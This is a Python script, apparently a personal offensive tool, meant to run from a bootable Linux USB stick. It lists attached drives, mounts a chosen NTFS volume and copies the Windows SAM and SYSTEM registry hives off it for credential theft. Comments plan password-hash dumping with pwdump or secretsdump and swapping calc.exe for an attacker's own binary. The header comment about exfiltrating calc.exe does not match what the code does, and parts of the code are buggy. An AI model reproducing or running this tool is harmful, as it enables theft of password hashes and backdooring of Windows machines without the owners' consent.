#!/usr/bin/env python3

# Author: Keenan Kunzelman
# Description: Meant to be run on a linux bootable usb. Program scans for all connected storage devices and looks for specific 
# file systems to mount and then exfils data. Only looks for NTFS and exfils the calc.exe program for now.

import sys, subprocess, argparse, time

# ****overengineered class that probably should go. I could just use tuple here to store source,fs values because source always has to be unique****
class Drive:
    def __init__(self):
        self.source = ""
        self.target = "/mnt"
        self.fs = ""
        self.options = "rw"

    def set_source(self, source):
        self.source = source
    def set_fs(self, fs):
        self.fs = fs

    def get_source(self):
        return self.source
    def get_target(self):
        return self.target
    def get_fs(self):
        return self.fs
    def get_options(self):
        return self.options



#Run the command sudo blkid and then recieve its output as a bytes
#Decode using utf-8 and then split on \n
def grab_drives():
    proc = subprocess.Popen("sudo blkid", stdout=subprocess.PIPE, shell=True)
    (drives, err) = proc.communicate()
    drives = drives.decode("utf-8").split("\n")
    return drives

# extracts the drives with ntfs types
# Modular for inclusion of *nix systems
def locate_winfs(drives):
    win_drives = []
    for drive in drives:
        if "ntfs" in drive:
            win_drives.append(drive)
    return win_drives
 
def mount_drive(drive):
    #should refactor to accept input for /media/drivetype to exploit different file systems
    
    subprocess.Popen(["sudo mount -t ntfs-3g -o nls=utf8 {} /media/windows".format(drive.get_source()), "/etc/services"], shell=True)
    time.sleep(1)

def find_winpayload():
    subprocess.call('cp /media/windows/Windows/System32/config/SAM ~/Desktop/', shell=True)
    subprocess.call('cp /media/windows/Windows/System32/config/SYSTEM ~/Desktop/', shell=True)

    print('Sytem and Sam registry hives have been succesfully exfiltrated to ~/Desktop')
    # i should implement some code that suggests a drive to choose based off of mounting other ones and lsing
    # them. This will be slow but very cool

def store_drives(raw_drives):
    obj_drives = []
    for i in range(len(raw_drives)):
        temp_drive = Drive()
        temp_raw_drive = raw_drives[i].split()
        for attribute in temp_raw_drive:
            if "/dev" in attribute:         
                attribute = list(attribute)
                attribute.pop()
                attribute = "".join(attribute)
                temp_drive.set_source(attribute)     
            elif "TYPE" in attribute:
                temp_drive.set_fs(attribute)
        obj_drives.append(temp_drive)
    return obj_drives

def dump_hashes():
    #incorporate pwdump or secretsdump.py to dump the hashes to the screen or a file
    # mayb use pwdump if host onl8y has local hashed but use secretsdump if it is a 
    # domain controller.
    pass


def pretty_print(drives):
    apl_drives = linux_drives =  allpurpose_drives = win_drives = []
  
    print("********************************************************************************************",end ="")
    print("\n*    NTFS              APFS                ext4                FAT             squashfs    *",end ="")
    for drive in drives:
        if "ntfs" in drive.get_fs():
            print("\n*  {}            X                   X                   X                 X        *".format(drive.get_source()), end="")
        elif "apfs" in drive.get_fs():
            apl_drives.append(drive)
        elif "ext4" in drive.get_fs():
            print("\n*     X                 X               {}               X                 X        *".format(drive.get_source()), end="")
        # elif "fat" or "fat32" in drive.get_fs():
        #     allpurpose_drives.append(drive)
        elif "squashfs" in drive.get_fs():
            if len(drive.get_source()) == 10:
                print("\n*     X                 X                   X                   X             {}   *".format(drive.get_source()), end="")
            elif len(drive.get_source()) == 11:
                print("\n*     X                 X                   X                   X             {}  *".format(drive.get_source()), end="")

  
    
    print("\n********************************************************************************************",end ="\n")


        

def main():
    parser = argparse.ArgumentParser(description='Choose which mode to run program in. No input lists all the storage devices.')
    group = parser.add_mutually_exclusive_group()
    group.add_argument('-w', '--exfil_win', action="store_true")
    args = parser.parse_args()
    
    drives = grab_drives()
    all_drives = store_drives(drives)
    if args.exfil_win:
        drive_count = 0
        raw_win_drives = locate_winfs(drives)
        win_drives = store_drives(raw_win_drives)
        print("Conected drives using the NTFS file system.\n")
        for drive in raw_win_drives:
            print("Drive {}\n{}\n".format(drive_count, drive))
            drive_count += 1
        target = input("\n========================================================\n2 please choose a drive to exploit. Note drives start at 0\nDrive ")
        print("Targeting: " + raw_win_drives[int(target)])
        mount_drive(win_drives[int(target)])
        find_winpayload()
    elif not len(sys.argv) > 1:
        pretty_print(all_drives)
        
    else:
        print("invalid flag")

    # dump_hashes()
 

if __name__ == '__main__':
    main()
    


#pretty print script run with no drives

# implement sam syste security and software

# Got to implement non hardcoded vals

# unmount the drive

# new arg that cp files onto the windows box

# find calc.exe rename it to calcbak.exe upload own version of calc

# bonus win10 registry of offline systems. 

# shit get cached in hybernation file?